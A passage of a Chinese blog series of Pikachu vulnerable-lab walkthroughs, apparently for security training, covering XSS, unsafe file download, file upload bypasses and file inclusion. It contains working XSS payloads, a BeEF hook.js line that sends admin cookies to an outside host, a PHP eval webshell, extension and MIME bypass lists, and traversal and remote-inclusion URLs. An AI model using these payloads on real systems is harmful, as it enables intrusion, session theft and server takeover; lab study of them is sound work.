<h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>onfocus表示鼠标放上去触发</p>
<p><img src="/images/image-20230109085300848.png" alt="image-20230109085300848"></p>
<h4 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=alert(123)&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=alert(123);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>onload:当页面加载完毕时执行代码</p>
<p><img src="/images/image-20230109085540498.png" alt="image-20230109085540498"></p>
<h4 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109090052786.png" alt="image-20230109090052786"></p>
<p><img src="/images/image-20230109090104388.png" alt="image-20230109090104388"></p>
<h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(111)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109090247285.png" alt="image-20230109090247285"></p>
<h4 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a>button标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onfocus=alert(1)&gt;</span><br><span class="line">&lt;button onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>onclick点击触发</p>
<p><img src="/images/image-20230109090328767.png" alt="image-20230109090328767"></p>
<h4 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h4><p>该标签需要配合data:&#x2F;&#x2F;text伪协议利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109090507237.png" alt="image-20230109090507237"></p>
<p><img src="/images/image-20230109090547150.png" alt="image-20230109090547150"></p>
<p><img src="/images/image-20230109090602207.png" alt="image-20230109090602207"></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有其他的绕过方式，比如其他的标签，实体编码绕过，闭合等方式，可自行查阅搭建靶场进行绕过，后续题目也会涉及。</p>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/E3G5juHSQjzRNSZcgiTmQA">https://mp.weixin.qq.com/s/E3G5juHSQjzRNSZcgiTmQA</a></p>
<p><a href="https://www.freebuf.com/articles/web/339348.html">https://www.freebuf.com/articles/web/339348.html</a></p>
<h1 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h1><p>根据提示输入tmac</p>
<p><img src="/images/image-20230109094736189.png" alt="image-20230109094736189"></p>
<p>前端查看js代码</p>
<p><img src="/images/image-20230109094912346.png" alt="image-20230109094912346"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	$ms=&#x27;tmac&#x27;;</span><br><span class="line">    if($ms.length != 0)&#123;</span><br><span class="line">        if($ms == &#x27;tmac&#x27;)&#123;</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">//            alert($ms);</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再随便输入一串字符</p>
<p><img src="/images/image-20230109095120480.png" alt="image-20230109095120480"></p>
<p>传入的字符会被放进该$ms，于是我们就可以构造闭合</p>
<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>先使用闭合前面的<script>，再执行自己的payload</p>
<p><img src="/images/image-20230109095418811.png" alt="image-20230109095418811"></p>
<p>这些题的逻辑都类似，找闭合，绕过过滤，绕过实体转换</p>
<h1 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h1><p>盲打指的是一种攻击场景</p>
<p>在留言框或姓名中插入Payload测试，根据提示登录到后台查看留言的信息，直接触发XSS</p>
<p>先随便输入一些内容</p>
<p><img src="/images/image-20230108023741293.png" alt="image-20230108023741293"></p>
<p>提示给出了后台地址</p>
<p><img src="/images/image-20230108023827084.png" alt="image-20230108023827084"></p>
<p>根据提示登录</p>
<p><img src="/images/image-20230108024052825.png" alt="image-20230108024052825"></p>
<p>可以看到我们输入的内容</p>
<p><img src="/images/image-20230108024128492.png" alt="image-20230108024128492"></p>
<p>该场景叫做盲打也是因为这个，插入xss payload后，我们只能等待管理员点击从而利用</p>
<p>数据库中能够看到插入的payload</p>
<p><img src="/images/image-20230108030928953.png" alt="image-20230108030928953"></p>
<p>所以也属于存储型XSS</p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>这里可以用之前的BEEF平台进行利用</p>
<p>这里先使用alert弹窗进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(111)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230108025041967.png" alt="image-20230108025041967"></p>
<p>当管理员登录后台后，就会出现弹窗</p>
<p><img src="/images/image-20230108025123698.png" alt="image-20230108025123698"></p>
<p>pikachu有自己的XSS平台</p>
<p><img src="/images/image-20230108030049268.png" alt="image-20230108030049268"></p>
<p>需要提前配置数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pikachu\inc\config.inc.php</span><br></pre></td></tr></table></figure>

<p>安装初始化即可</p>
<p><img src="/images/image-20230108030444690.png" alt="image-20230108030444690"></p>
<p>这里我们使用beef进行测试</p>
<p>具体使用在《BeEF xss利用框架安装使用.md》中有说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230108170625920.png" alt="image-20230108170625920"></p>
<p>管理员登录到后台后</p>
<p>可以看到beef这边已有主机信息，包括cookie等</p>
<p><img src="/images/image-20230108170850091.png" alt="image-20230108170850091"></p>
<h1 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h1><p>该题如果输出的信息为<a href="http://www.baidu.com时则正常输出,反之则将输入的值使用htmlspecialchars()函数进行转换/">www.baidu.com时则正常输出，反之则将输入的值使用htmlspecialchars()函数进行转换</a></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;#?</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109094424113.png" alt="image-20230109094424113"></p>
<p>可以发现压根没有闭合等，输入啥就是啥</p>
<h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>可以使用javascript协议来执行js，当点击超链接时会执行该js脚本实现弹窗</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109094619596.png" alt="image-20230109094619596"></p>
<p>点击触发</p>
<p><img src="/images/image-20230109094603430.png" alt="image-20230109094603430"></p>
<h2 id="javascript协议"><a href="#javascript协议" class="headerlink" title="javascript协议"></a>javascript协议</h2><p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。</p>
<p>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>

<p>实际上是将javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p>
<h1 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h1><p>主要是对htmlspecialchars()函数进行绕过</p>
<p>htmlspecialchars()是PHP里面把预定义的字符转换为HTML实体的函数</p>
<p><img src="/images/image-20230109091304591.png" alt="image-20230109091304591"></p>
<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;#?</span><br></pre></td></tr></table></figure>

<p>注意需要先用一个单引号将href的双引号闭合后才能看出结果</p>
<p><img src="/images/image-20230109092023309.png" alt="image-20230109092023309"></p>
<p>根据上方返回的信息可以看到字符双引号，<，>都被转换成了HTML实体函数(默认不对'进行处理)</p>
<h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p>寻找闭合，避开被转换的字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(123) &#x27;</span><br></pre></td></tr></table></figure>

<p>点击触发</p>
<p><img src="/images/image-20230109092702680.png" alt="image-20230109092702680"></p>
<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/escape-w/p/10162831.html">https://www.cnblogs.com/escape-w/p/10162831.html</a></p>
</script></p>]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-不安全的文件下载</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
<p>文件下载的url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>

<p>如果未做好限制，则会造成任意文件下载</p>
<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-文件上传</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<p>首先保存一个shell.php用于上传</p>
<p>当上传时，会显示文件不符合要求</p>
<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
<p>其实弹窗已经可以初步判断是客户端校验了</p>
<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
<p>直接将其删除</p>
<p>此时再上传就不会有任何问题</p>
<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
<p>蚁剑成功连接</p>
<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
<p>但同样为保留字符的0x80不行</p>
<p>在文件后缀名后的hex添加一个81</p>
<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>

<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>

<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>

<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>

<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>

<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>

<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
<p>从而达到绕过的目的</p>
<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>

<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>

<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
<p>可以看到还校验了文件内容</p>
<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<p>这是gif文件的文件头</p>
<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
<p>2.更改后缀为png</p>
<p>3.更改MIME类型为image&#x2F;png</p>
<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
<p>成功上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>

<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>

<p>url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>成功连接webshell</p>
<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
<p>MIME是由上传文件的body的Content-Type指定的</p>
<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>

<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
<p>将其改为jpg或png的MIME类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>

<p>成功上传</p>
<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
<p>成功连接webshell</p>
<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>

<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>

<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>

<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>

<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-文件包含</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h1><p><img src="/images/1665555684868-38ea26c8-b175-45e4-95a3-435db5eb951b.png" alt="img"></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="涉及函数"><a href="#涉及函数" class="headerlink" title="涉及函数"></a>涉及函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br><span class="line">include_once() 与include()相同，区别在于当被包含的代码存在时，则不重复包含 </span><br><span class="line">require_once() 与require()相同，区别在于当被包含的代码存在时，则不重复包含</span><br></pre></td></tr></table></figure>

<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1、可以包含任何文件 </p>
<p>2、被包含文件中的代码满足php代码格式就会被解析执行，与后缀无关。</p>
<p>3、如果文件中的内容不满足php代码格式，那就会直接显示在页面上。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这样是正常的，因为我们还没有对其file参数传参</p>
<p><img src="/images/1665548578354-65d54b73-13d4-479e-a612-8a94666a946e.png" alt="img"></p>
<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
<p><img src="/images/1665548677709-994eb1e9-8ce4-4b54-a7ce-b43ba524a81b.png" alt="img"></p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=../index.html">http://127.0.0.1:88/DX/file_include/index.php?file=../index.html</a></p>
<p><img src="/images/1665548837727-24f9f2b0-6db0-444a-87bf-6fd594234b14.png" alt="img"></p>
<p>只要是php代码就行，文件后缀无所谓</p>
<p><img src="/images/1665548957675-151147db-cf72-4912-b15b-912d05a3f5a3.png" alt="img"></p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
<p><img src="/images/1665548976257-f26bdcd3-3cd0-44d7-bf92-58b022181c82.png" alt="img"></p>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com">http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com</a></p>
<p><img src="/images/1665549175086-f3f7b228-8f11-403c-b1b2-d24645f4da35.png" alt="img"></p>
<p>包含一句话后连接</p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=http://101.35.17.6:6666/test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=http://101.35.17.6:6666/test.txt</a></p>
<p><img src="/images/1665549338675-ef15c7d1-969f-42ac-8901-ed8d07b561f7.png" alt="img"></p>
<p><img src="/images/1665549391173-c968d06e-653e-455f-b332-b3a2d5c929f2.png" alt="img"></p>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>访问本地系统文件</p>
<p><img src="/images/1665549595086-117eac0d-a45f-4cef-b0cb-7b2725264307.png" alt="img"></p>
